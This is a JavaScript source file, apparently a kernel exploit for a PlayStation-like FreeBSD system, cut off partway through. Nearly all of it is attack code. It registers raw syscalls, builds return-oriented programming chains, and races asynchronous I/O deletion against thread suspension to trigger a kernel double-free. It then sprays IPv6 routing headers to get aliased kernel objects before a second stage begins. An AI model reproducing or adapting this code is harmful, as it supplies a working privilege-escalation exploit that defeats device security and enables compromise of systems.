    return mem.view(addr).getUint16(0, true)
}

function read32 (addr) {
    return mem.view(addr).getUint32(0, true)
}

function read64 (addr) {
    return mem.view(addr).getBigInt(0, true)
}

function malloc(size) {
    return mem.malloc(size)
}

function hex(val) {
    if (val instanceof BigInt)
        return val.toString();
    return '0x' + val.toString(16).padStart(2, '0');
}

function send_notification(msg) {
    utils.notify(msg);
}

// Socket constants - only define if not already in scope
// (inject.js defines some of these as const in the eval scope)
if (typeof AF_UNIX === 'undefined') AF_UNIX = 1;
if (typeof AF_INET === 'undefined') AF_INET = 2;
if (typeof AF_INET6 === 'undefined') AF_INET6 = 28;

if (typeof SOCK_STREAM === 'undefined') SOCK_STREAM = 1;
if (typeof SOCK_DGRAM === 'undefined') SOCK_DGRAM = 2;

if (typeof IPPROTO_TCP === 'undefined') IPPROTO_TCP = 6;
if (typeof IPPROTO_UDP === 'undefined') IPPROTO_UDP = 17;
if (typeof IPPROTO_IPV6 === 'undefined') IPPROTO_IPV6 = 41;

if (typeof SOL_SOCKET === 'undefined') SOL_SOCKET = 0xFFFF;
if (typeof SO_REUSEADDR === 'undefined') SO_REUSEADDR = 4;
if (typeof SO_LINGER === 'undefined') SO_LINGER = 0x80;

// IPv6 socket options
if (typeof IPV6_PKTINFO === 'undefined') IPV6_PKTINFO = 46;
if (typeof IPV6_NEXTHOP === 'undefined') IPV6_NEXTHOP = 48;
if (typeof IPV6_RTHDR === 'undefined') IPV6_RTHDR = 51;
if (typeof IPV6_TCLASS === 'undefined') IPV6_TCLASS = 61;
if (typeof IPV6_2292PKTOPTIONS === 'undefined') IPV6_2292PKTOPTIONS = 25;

// TCP socket options
if (typeof TCP_INFO === 'undefined') TCP_INFO = 32;
if (typeof TCPS_ESTABLISHED === 'undefined') TCPS_ESTABLISHED = 4;
if (typeof size_tcp_info === 'undefined') size_tcp_info = 0xec;  /* struct tcp_info */

// Create shorthand references
var unlink        = fn.register(0xA, 'unlink', 'bigint');
var pipe          = fn.register(42, 'pipe', 'bigint');
var getpid        = fn.register(20, 'getpid', 'bigint');
var getuid        = fn.register(0x18, 'getuid', 'bigint');
var kill          = fn.register(37, 'kill', 'bigint');
var connect       = fn.register(98, 'connect', 'bigint');
var munmap        = fn.register(0x49, 'munmap', 'bigint');
var mprotect      = fn.register(0x4A, 'mprotect', 'bigint');
var getsockopt    = fn.register(0x76, 'getsockopt', 'bigint');
var socketpair    = fn.register(0x87, 'socketpair', 'bigint');
var sysctl        = fn.register(0x0ca, 'sysctl', 'bigint');
var nanosleep     = fn.register(0xF0, 'nanosleep', 'bigint');
var sched_yield   = fn.register(0x14B, 'sched_yield', 'bigint');
var thr_exit      = fn.register(0x1AF, 'thr_exit', 'bigint');
var thr_self      = fn.register(0x1B0, 'thr_self', 'bigint');
var thr_new       = fn.register(0x1C7, 'thr_new', 'bigint');
var rtprio_thread = fn.register(0x1D2, 'rtprio_thread', 'bigint');
var mmap               = fn.register(477, 'mmap', 'bigint');
var cpuset_getaffinity = fn.register(0x1E7, 'cpuset_getaffinity', 'bigint');
var cpuset_setaffinity = fn.register(0x1E8, 'cpuset_setaffinity', 'bigint');
var jitshm_create = fn.register(0x215, 'jitshm_create', 'bigint');
var jitshm_alias  = fn.register(0x216, 'jitshm_alias', 'bigint');

var evf_create    = fn.register(0x21A, 'evf_create', 'bigint');
var evf_devare    = fn.register(0x21B, 'evf_devare', 'bigint');
var evf_set       = fn.register(0x220, 'evf_set', 'bigint');
var evf_clear     = fn.register(0x221, 'evf_clear', 'bigint');
var evf_delete    = fn.register(0x21b, 'evf_delete', 'bigint');

var is_in_sandbox = fn.register(0x249, 'is_in_sandbox', 'bigint');
var dlsym         = fn.register(0x24F, 'dlsym', 'bigint');
var thr_suspend_ucontext = fn.register(0x278, 'thr_suspend_ucontext', 'bigint');
var thr_resume_ucontext  = fn.register(0x279, 'thr_resume_ucontext', 'bigint');

var aio_multi_delete     = fn.register(0x296, 'aio_multi_delete', 'bigint');
var aio_multi_wait       = fn.register(0x297, 'aio_multi_wait', 'bigint');
var aio_multi_poll       = fn.register(0x298, 'aio_multi_poll', 'bigint');
var aio_multi_cancel     = fn.register(0x29A, 'aio_multi_cancel', 'bigint');
var aio_submit_cmd       = fn.register(0x29D, 'aio_submit_cmd', 'bigint');

var kexec                = fn.register(0x295, 'kexec', 'bigint');
var socket               = fn.register(0x61, 'socket', 'bigint');
var setsockopt           = fn.register(0x69, 'setsockopt', 'bigint');
var bind                 = fn.register(0x68, 'bind', 'bigint');
var read                 = fn.register(0x3, 'read', 'bigint');
var write                = fn.register(0x4, 'write', 'bigint');
var open                 = fn.register(0x5, 'open', 'bigint');
var close                = fn.register(0x6, 'close', 'bigint');
var accept               = fn.register(0x1e, 'accept', 'bigint');
var listen               = fn.register(0x6a, 'listen', 'bigint');
var getsockname          = fn.register(0x20, 'getsockname', 'bigint');

var setjmp = fn.register(libc_addr.add(0x6CA00), 'setjmp', 'bigint');
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp = fn.register(libc_addr.add(0x6CA50), 'longjmp', 'bigint');
var longjmp_addr = libc_addr.add(0x6CA50);

// Extract syscall wrapper addresses for ROP chains from syscalls.map
var read_wrapper                 = syscalls.map.get(0x03)
var write_wrapper                = syscalls.map.get(0x04)
var sched_yield_wrapper          = syscalls.map.get(0x14b)
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278)
var cpuset_setaffinity_wrapper   = syscalls.map.get(0x1e8)
var rtprio_thread_wrapper        = syscalls.map.get(0x1D2)
var aio_multi_delete_wrapper     = syscalls.map.get(0x296)
var thr_exit_wrapper             = syscalls.map.get(0x1af)

var BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);

function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
    const translate_name_mib = malloc(0x8);
    const buf_size = 0x70;
    const mib = malloc(buf_size);
    const size = malloc(0x8);
    
    write64(translate_name_mib, new BigInt(0x3, 0x0));
    write64(size, buf_size);
    
    const name_addr = utils.cstr(name);
    const name_len = new BigInt(name.length);
   
    if (sysctl(translate_name_mib, 2, mib, size, name_addr, name_len) === new BigInt(0xffffffff, 0xffffffff)) {
        log("failed to translate sysctl name to mib (" + name + ")");
    }
    
    if (sysctl(mib, 2, oldp, oldp_len, newp, newp_len) === new BigInt(0xffffffff, 0xffffffff)) {
        return false;
    }
    
    return true;
}

function get_fwversion() {
    const buf = malloc(0x8);
    const size = malloc(0x8);
    write64(size, 0x8);
    if (sysctlbyname("kern.sdk_version", buf, size, 0, 0)) {
        const byte1 = Number(read8(buf.add(2)));  // Minor version (first byte)
        const byte2 = Number(read8(buf.add(3)));  // Major version (second byte)
        
        const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
        return version;
    }
    
    return null;
}

function init_threading() {
    const jmpbuf = malloc(0x60);
    setjmp(jmpbuf);
    saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
    saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}   

function pin_to_core(core) {
    const mask = malloc(0x10);
    write32(mask, 1 << core);
    cpuset_setaffinity(3, 1, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0x10, mask);
}

function get_core_index(mask_addr) {
    var num = Number(read32(mask_addr));
    var position = 0;
    while (num > 0) {
        num = num >>> 1;
        position++;
    }
    return position - 1;
}

function get_current_core() {
    const mask = malloc(0x10);
    cpuset_getaffinity(3, 1, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0x10, mask);
    return get_core_index(mask);
}

function set_rtprio(prio) {
    const rtprio = malloc(0x4);
    write16(rtprio, PRI_REALTIME);
    write16(rtprio.add(2), prio);
    rtprio_thread(RTP_SET, 0, rtprio);
}

function get_rtprio() {
    const rtprio = malloc(0x4);
    write16(rtprio, PRI_REALTIME);
    write16(rtprio.add(2), 0);
    rtprio_thread(RTP_LOOKUP, 0, rtprio);
    return Number(read16(rtprio.add(2)));
}

function aio_submit_cmd_fun(cmd, reqs, num_reqs, priority, ids) {
    const result = aio_submit_cmd(cmd, reqs, num_reqs, priority, ids);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("aio_submit_cmd error: " + hex(result));
    }
    return result;
}

function aio_multi_cancel_fun(ids, num_ids, states) {
    const result = aio_multi_cancel(ids, num_ids, states);
    if (result.eq(BigInt_Error)) {
        throw new Error("aio_multi_cancel error: " + hex(result));
    }
    return result;
}

function aio_multi_poll_fun(ids, num_ids, states) {
    const result = aio_multi_poll(ids, num_ids, states);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("aio_multi_poll error: " + hex(result));
    }
    return result;
}

function aio_multi_wait_fun(ids, num_ids, states, mode, timeout) {
    const result = aio_multi_wait(ids, num_ids, states, mode, timeout);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("aio_multi_wait error: " + hex(result));
    }
    return result;
}

function aio_multi_delete_fun(ids, num_ids, states) {
    const result = aio_multi_delete(ids, num_ids, states);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("aio_multi_delete error: " + hex(result));
    }
    return result;
}

function make_reqs1(num_reqs) {
    const reqs = malloc(0x28 * num_reqs);
    for (var i = 0; i < num_reqs; i++) {
        write32(reqs.add(i * 0x28 + 0x20), 0xFFFFFFFF);
    }
    return reqs;
}

function spray_aio(loops, reqs, num_reqs, ids, multi, cmd) {
    loops = loops || 1;
    cmd = cmd || AIO_CMD_READ;
    if (multi === undefined) multi = true;

    const step = 4 * (multi ? num_reqs : 1);
    const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0);

    for (var i = 0; i < loops; i++) {
        aio_submit_cmd_fun(final_cmd, reqs, num_reqs, 3, ids + (i * step));
    }
}

function cancel_aios(ids, num_ids) {
    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (var i = 0; i < num_batches; i++) {
        aio_multi_cancel_fun(ids + (i * 4 * len), len, errors);
    }

    if (rem > 0) {
        aio_multi_cancel_fun(ids + (num_batches * 4 * len), rem, errors);
    }
}

function free_aios(ids, num_ids, do_cancel) {
    if (do_cancel === undefined) do_cancel = true;

    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (var i = 0; i < num_batches; i++) {
        const addr = ids + i * 4 * len;
        if (do_cancel) {
            aio_multi_cancel_fun(addr, len, errors);
        }
        aio_multi_poll_fun(addr, len, errors);
        aio_multi_delete_fun(addr, len, errors);
    }

    if (rem > 0) {
        const addr = ids + (num_batches * 4 * len);
        if (do_cancel) {
            aio_multi_cancel_fun(addr, rem, errors);
        }
        aio_multi_poll_fun(addr, rem, errors);
        aio_multi_delete_fun(addr, rem, errors);
    }
}

function free_aios2(ids, num_ids) {
    free_aios(ids, num_ids, false);
}

function aton(ip_str) {
    const parts = ip_str.split('.').map(Number);
    return (parts[3] << 24) | (parts[2] << 16) | (parts[1] << 8) | parts[0];
}

function new_tcp_socket() {
    const sd = socket(AF_INET, SOCK_STREAM, 0);
    if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("new_tcp_socket error: " + hex(sd));
    }
    return sd
}

function new_socket() {
    const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("new_socket error: " + hex(sd));
    }
    return sd
}

function create_pipe() {
    const fildes = malloc(0x10);
    const result = pipe(fildes);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("pipe syscall failed");
    }
    const read_fd  = new BigInt(read32(fildes));         // easier to have BigInt for upcoming usage
    const write_fd = new BigInt(read32(fildes.add(4)));  // easier to have BigInt for upcoming usage
    return [read_fd, write_fd];
}

function spawn_thread(rop_race1_array) {
    const rop_race1_addr = malloc(0x400); // ROP Stack plus extra size
    //log("This is rop_race1_array.length " + rop_race1_array.length);
    // Fill ROP Stack
    for(var i=0 ; i < rop_race1_array.length ; i++) {
        write64(rop_race1_addr.add(i*8), new BigInt(rop_race1_array[i]));
        //log("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
    }

    const jmpbuf = malloc(0x60);

    // FreeBSD amd64 jmp_buf layout:
    // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
    write64(jmpbuf.add(0x00), gadgets.RET);         // RIP - ret gadget
    write64(jmpbuf.add(0x10), rop_race1_addr);      // RSP - pivot to ROP chain
    write32(jmpbuf.add(0x40), new BigInt(saved_fpu_ctrl)); // FPU control
    write32(jmpbuf.add(0x44), new BigInt(saved_mxcsr));    // MXCSR

    const stack_size = new BigInt(0x400);
    const tls_size = new BigInt(0x40);

    const thr_new_args  = malloc(0x80);
    const tid_addr      = malloc(0x8);
    const cpid          = malloc(0x8);
    const stack         = malloc(Number(stack_size));
    const tls           = malloc(Number(tls_size));

    write64(thr_new_args.add(0x00), longjmp_addr);       // start_func = longjmp
    write64(thr_new_args.add(0x08), jmpbuf);             // arg = jmpbuf
    write64(thr_new_args.add(0x10), stack);              // stack_base
    write64(thr_new_args.add(0x18), stack_size);         // stack_size
    write64(thr_new_args.add(0x20), tls);                // tls_base
    write64(thr_new_args.add(0x28), tls_size);           // tls_size
    write64(thr_new_args.add(0x30), tid_addr);           // child_tid (output)
    write64(thr_new_args.add(0x38), cpid);               // parent_tid (output)

    const result = thr_new(thr_new_args, new BigInt(0x68));
    if (!result.eq(0)) {
        throw new Error("thr_new failed: " + hex(result));
    }

    return read64(tid_addr);
}

function nanosleep_fun(nsec) {
    const timespec = malloc(0x10);
    write64(timespec, Math.floor(nsec / 1e9));    // tv_sec
    write64(timespec.add(8), nsec % 1e9);         // tv_nsec
    nanosleep(timespec);
}

function wait_for(addr, threshold) {
    while (!read64(addr).eq(new BigInt(threshold))) {
        nanosleep_fun(1);
    }
}

function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {

    var insts = [];

    // write(pipe_write_fd, pipe_buf, 1) - using per-syscall gadget
    insts.push(gadgets.POP_RDI_RET);
    insts.push(pipe_write_fd);
    insts.push(gadgets.POP_RSI_RET);
    insts.push(pipe_buf);
    insts.push(gadgets.POP_RDX_RET);
    insts.push(new BigInt(1));
    insts.push(write_wrapper);

    // sched_yield() - using per-syscall gadget
    insts.push(sched_yield_wrapper);

    // thr_suspend_ucontext(thr_tid) - using per-syscall gadget
    insts.push(gadgets.POP_RDI_RET); // pop rdi ; ret
    insts.push(thr_tid);
    insts.push(thr_suspend_ucontext_wrapper);

    // return value in rax is stored by rop.store()

    var store_size = 0x10; // 2 slots 1 for RBP and another for last syscall ret value
    var store_addr = mem.malloc(store_size);

    rop.store(insts, store_addr, 1);

    rop.execute(insts, store_addr, store_size);

    return read64(store_addr.add(8)); // return value for 2nd slot
}

function race_one(req_addr, tcp_sd, sds) {
    try {
        //log("this is ready_signal and deletion_signal " + hex(ready_signal) + " " + hex(deletion_signal));
        write64(ready_signal, 0);
        write64(deletion_signal, 0);

        const sce_errs = malloc(0x100);  // 8 bytes for errs + scratch for TCP_INFO
        write32(sce_errs,        0xFFFFFFFF);  // -1
        write32(sce_errs.add(4), 0xFFFFFFFF);  // -1
        //log("race_one before pipe");
        var pipe_fds = create_pipe();
        const pipe_read_fd = pipe_fds[0];
        const pipe_write_fd = pipe_fds[1];
        //const [pipe_read_fd, pipe_write_fd] = create_pipe();
        //log("race_one after pipe");

        var rop_race1 = [];

        rop_race1.push(new BigInt(0)); // first element overwritten by longjmp, skip it
        
        const cpu_mask = malloc(0x10);
        write16(cpu_mask, 1 << MAIN_CORE);

        // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(new BigInt(3));                        // CPU_LEVEL_WHICH
        rop_race1.push(gadgets.POP_RSI_RET);
        rop_race1.push(new BigInt(1));                        // CPU_WHICH_TID
        rop_race1.push(gadgets.POP_RDX_RET);
        rop_race1.push(new BigInt(0xFFFFFFFF, 0xFFFFFFFF));   // id = -1 (current thread)
        rop_race1.push(gadgets.POP_RCX_RET);
        rop_race1.push(new BigInt(0x10));                     // setsize
        rop_race1.push(gadgets.POP_R8_RET);
        rop_race1.push(cpu_mask);
        rop_race1.push(cpuset_setaffinity_wrapper);

        const rtprio_buf = malloc(4);
        write16(rtprio_buf, PRI_REALTIME);
        write16(rtprio_buf.add(2), MAIN_RTPRIO);

        // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(new BigInt(1));         // RTP_SET
        rop_race1.push(gadgets.POP_RSI_RET); 
        rop_race1.push(new BigInt(0));         // lwpid = 0 (current thread)
        rop_race1.push(gadgets.POP_RDX_RET);
        rop_race1.push(rtprio_buf);
        rop_race1.push(rtprio_thread_wrapper);

        // Signal ready - write 1 to ready_signal
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(ready_signal);
        rop_race1.push(gadgets.POP_RAX_RET);
        rop_race1.push(new BigInt(1));
        rop_race1.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

        // Read from pipe (blocks here) - read(pipe_read_fd, pipe_buf, 1)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(pipe_read_fd);
        rop_race1.push(gadgets.POP_RSI_RET);
        rop_race1.push(pipe_buf);
        rop_race1.push(gadgets.POP_RDX_RET);
        rop_race1.push(new BigInt(1));
        rop_race1.push(read_wrapper);

        // aio multi delete - aio_multi_delete(req_addr, 1, sce_errs + 4)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(req_addr);
        rop_race1.push(gadgets.POP_RSI_RET);
        rop_race1.push(new BigInt(1));
        rop_race1.push(gadgets.POP_RDX_RET);
        rop_race1.push(sce_errs.add(4));
        rop_race1.push(aio_multi_delete_wrapper);

        // Signal deletion - write 1 to deletion_signal
        rop_race1.push(gadgets.POP_RDI_RET); // pop rdi ; ret
        rop_race1.push(deletion_signal);
        rop_race1.push(gadgets.POP_RAX_RET);
        rop_race1.push(new BigInt(1));
        rop_race1.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

        // Thread exit - thr_exit(0)
        rop_race1.push(gadgets.POP_RDI_RET);
        rop_race1.push(new BigInt(0));
        rop_race1.push(thr_exit_wrapper);

        //log("race_one before spawnt_thread");
        const thr_tid = spawn_thread(rop_race1);
        //log("race_one after spawnt_thread");
        
        // Wait for thread to signal ready
        wait_for(ready_signal, 1);
        //log("race_one after wait_for");

        const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
        log("Suspend result: " + hex(suspend_res));
        //log("race_one after call_suspend_chain");

        const scratch = sce_errs.add(8);  // Use offset for scratch space
        aio_multi_poll_fun(req_addr, 1, scratch);
        const poll_res = read32(scratch);
        log("poll_res after suspend: " + hex(poll_res));
        //log("race_one after aio_multi_poll_fun");

        get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, scratch, size_tcp_info);
        const tcp_state = read8(scratch);
        log("tcp_state: " + hex(tcp_state));

        var won_race = false;

        if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
            aio_multi_delete_fun(req_addr, 1, sce_errs);
            won_race = true;
            log("Race won!");
        }else {
            log("Race not won (poll_res=" + hex(poll_res) + " tcp_state=" + hex(tcp_state) + ")");
        }

        const resume_result = thr_resume_ucontext(thr_tid);
        log("Resume " + hex(thr_tid) + ": " + resume_result);
        //log("race_one after thr_resume_ucontext");
        nanosleep_fun(5);

        if (won_race) {
            const err_main_thr = read32(sce_errs);
            const err_worker_thr = read32(sce_errs.add(4));
            log("sce_errs: main=" + hex(err_main_thr) + " worker=" + hex(err_worker_thr));

            if (err_main_thr === err_worker_thr && err_main_thr === 0) {
                log("Double-free successful, making aliased rthdrs...");
                const sd_pair = make_aliased_rthdrs(sds);

                if (sd_pair !== null) {
                    close(pipe_read_fd);
                    close(pipe_write_fd);
                    return sd_pair;
                } else {
                    log("Failed to make aliased rthdrs");
                }
            } else {
                log("sce_errs mismatch - race failed");
            }
        }

        close(pipe_read_fd);
        close(pipe_write_fd);

        return null;

    } catch (e) {
        log("  race_one error: " + e.message);
        return null;
    }
}

function build_rthdr(buf, size) {
    const len = ((Number(size) >> 3) - 1) & ~1;
    const actual_size = (len + 1) << 3;
        write8(buf, 0);
        write8(buf.add(1), len);
        write8(buf.add(2), 0);
        write8(buf.add(3), len >> 1);
    return actual_size;
}

function set_sockopt(sd, level, optname, optval, optlen) {
    const result = setsockopt(sd, level, optname, optval, optlen);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("set_sockopt error: " + hex(result));
    }
    return result;
}

function get_sockopt(sd, level, optname, optval, optlen) {
    const len_ptr = malloc(4);
    write32(len_ptr, optlen);
    const result = getsockopt(sd, level, optname, optval, len_ptr);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("get_sockopt error: " + hex(result));
    }
    return read32(len_ptr);
}

function set_rthdr(sd, buf, len) {
    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function get_rthdr(sd, buf, max_len) {
    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}

function free_rthdrs(sds) {
    for (var i = 0; i < sds.length; i++) {
        if (!sds[i].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
        }
    }
}

function make_aliased_rthdrs(sds) {
    const marker_offset = 4;
    const size = 0x80;
    const buf = malloc(size);
    const rsize = build_rthdr(buf, size);

    for (var loop = 1; loop <= NUM_ALIAS; loop++) {
        for (var i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (!sds[i-1].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[i-1] !== 0xffffffffffffffff
                write32(buf.add(marker_offset), i);
                set_rthdr(sd, buf, rsize);
            }
        }

        for (var i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (!sds[i-1].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[i-1] !== 0xffffffffffffffff
                get_rthdr(sd, buf, size);
                const marker = Number(read32(buf.add(marker_offset)));

                if (marker !== i && marker > 0 && marker <= NUM_SDS) {
                    const aliased_idx = marker - 1;
                    const aliased_sd = Number(sds[aliased_idx]);
                    if (aliased_idx >= 0 && aliased_idx < sds.length && !sds[aliased_idx].eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) { // sds[aliased_idx] !== 0xffffffffffffffff
                        log("  Aliased pktopts found");
                        const sd_pair = [sd, aliased_sd];
                        const max_idx = Math.max(i-1, aliased_idx);
                        const min_idx = Math.min(i-1, aliased_idx);
                        sds.splice(max_idx, 1);
                        sds.splice(min_idx, 1);
                        free_rthdrs(sds);
                        sds.push(new_socket());
                        sds.push(new_socket());
                        return sd_pair;
                    }
                }
            }
        }
    }
    return null;
}

function setup() {
    try {

        init_threading();

        ready_signal = malloc(8);
        deletion_signal = malloc(8);
        pipe_buf = malloc(8);

        write64(ready_signal, 0);
        write64(deletion_signal, 0);

        prev_core = get_current_core();
        prev_rtprio = get_rtprio();

        pin_to_core(MAIN_CORE);
        set_rtprio(MAIN_RTPRIO);
        log("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);

        const sockpair = malloc(8);
        ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair);
        if (!ret.eq(0)) {
            return false;
        }

        block_fd = read32(sockpair);
        unblock_fd = read32(sockpair.add(4));

        const block_reqs = malloc(0x28 * NUM_WORKERS);
        for (var i = 0; i < NUM_WORKERS; i++) {
            const offset = i * 0x28;
            write32(block_reqs.add(offset).add(0x08), 1);
            write32(block_reqs.add(offset).add(0x20), block_fd);
        }

        const block_id_buf = malloc(4);
        ret = aio_submit_cmd_fun(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3, block_id_buf);
        if (!ret.eq(0)) {
            return false;
        }

        block_id = read32(block_id_buf);
        log("  AIO workers ready");

        const num_reqs = 3;
        const groom_reqs = make_reqs1(num_reqs);
        const groom_ids_addr = malloc(4 * NUM_GROOMS);

        spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false);
        cancel_aios(groom_ids_addr, NUM_GROOMS);

        groom_ids = [];
        for (var i = 0; i < NUM_GROOMS; i++) {
            groom_ids.push(Number(read32(groom_ids_addr.add(i * 4))));
        }

        sds = [];
        for (var i = 0; i < NUM_SDS; i++) {
            const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
                throw new Error("socket alloc failed at sds[" + i + "] - reboot system");
            }
            sds.push(sd);
        }

        sds_alt = [];
        for (var i = 0; i < NUM_SDS_ALT; i++) {
            const sd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
                throw new Error("socket alloc failed at sds_alt[" + i + "] - reboot system");
            }
            sds_alt.push(sd);
        }
        log("  Sockets allocated (" + NUM_SDS + " + " + NUM_SDS_ALT + ")");

        return true;

    } catch (e) {
        log("  Setup failed: " + e.message);
        return false;
    }
}

function double_free_reqs2() {
    try {
        const server_addr = malloc(16);
        write8(server_addr.add(1), AF_INET);
        write16(server_addr.add(2), 0);
        write32(server_addr.add(4), aton("127.0.0.1"));

        const sd_listen = new_tcp_socket();

        const enable = malloc(4);
        write32(enable, 1);
        set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);

        ret = bind(sd_listen, server_addr, 16);

        if (!ret.eq(0)) {
            log("bind failed");
            close(sd_listen);
            return null;
        }

        const addr_len = malloc(4);
        write32(addr_len, 16);
        ret = getsockname(sd_listen, server_addr, addr_len)
        if (!ret.eq(0)) {
            log("getsockname failed");
            close(sd_listen);
            return null;
        }
        log("Bound to port: " + Number(read16(server_addr.add(2))));

        ret = listen(sd_listen, 1)
        if (!ret.eq(0)) {
            log("listen failed");
            close(sd_listen);
            return null;
        }
        
        const num_reqs  = 3;
        const which_req = num_reqs - 1;
        const reqs      = make_reqs1(num_reqs);
        const aio_ids   = malloc(4 * num_reqs);
        const req_addr  = aio_ids.add(which_req * 4);
        const errors    = malloc(4 * num_reqs);
        const cmd       = AIO_CMD_MULTI_READ;

        for (var attempt = 1; attempt <= NUM_RACES; attempt++) {
            //log("Race attempt " + attempt + "/" + NUM_RACES);

            const sd_client = new_tcp_socket();

            ret = connect(sd_client, server_addr, 16);
            if (!ret.eq(0)) {
                close(sd_client);
                continue;
            }

            const sd_conn = accept(sd_listen, 0, 0);
            //log("Race attempt after accept")
            const linger_buf = malloc(8);
            write32(linger_buf, 1);
            write32(linger_buf.add(4), 1);
            set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);
            //log("Race attempt after set_sockopt")
            write32(reqs.add(which_req * 0x28 + 0x20), sd_client);

            ret = aio_submit_cmd_fun(cmd, reqs, num_reqs, 3, aio_ids);
            if (!ret.eq(0)) {
                close(sd_client);
                close(sd_conn);
                continue;
            }
            //log("Race attempt after aio_submit_cmd_fun")
            aio_multi_cancel_fun(aio_ids, num_reqs, errors);
            //log("Race attempt after aio_multi_cancel_fun")
            aio_multi_poll_fun(aio_ids, num_reqs, errors);
            //log("Race attempt after aio_multi_poll_fun")
            
            close(sd_client);
            //log("Race attempt before race_one")
            const sd_pair = race_one(req_addr, sd_conn, sds);

            aio_multi_delete_fun(aio_ids, num_reqs, errors);
            close(sd_conn);

            if (sd_pair !== null) {
                log("Won race at attempt " + attempt);
                close(sd_listen);
                return sd_pair;
            }
        }

        close(sd_listen);
        return null;

    } catch (e) {
        log("Stage 1 error: " + e.message);
        return null;
    }
}

// Stage 2
function new_evf(name, flags) {
    const result = evf_create(name, 0, flags);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("evf_create error: " + hex(result));
    }
    return result;
}

function set_evf_flags(id, flags) {
    const result = evf_clear(id, 0);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("evf_clear error: " + hex(result));
    }
    result = evf_set(id, flags);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("evf_set error: " + hex(result));
    }
    return result;
}

function free_evf(id) {
    const result = evf_delete(id);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("evf_delete error: " + hex(result));
    }
    return result;
}

function verify_reqs2(addr, cmd) {
    if (read32(addr) !== cmd) {
        return false;
    }

    const heap_prefixes = [];

    for (var i = 0x10; i <= 0x20; i += 8) {
        if (read16(addr.add(i + 6)) !== 0xffff) {
            return false;
        }
        heap_prefixes.push(Number(read16(addr.add(i + 4))));
    }

    const state1 = Number(read32(addr.add(0x38)));
    const state2 = Number(read32(addr.add(0x3c)));
    if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
        return false;
    }

    if (!read64(addr.add(0x40)).eq(0)) {
        return false;
    }

    for (var i = 0x48; i <= 0x50; i += 8) {
        if (read16(addr.add(i + 6)) === 0xffff) {
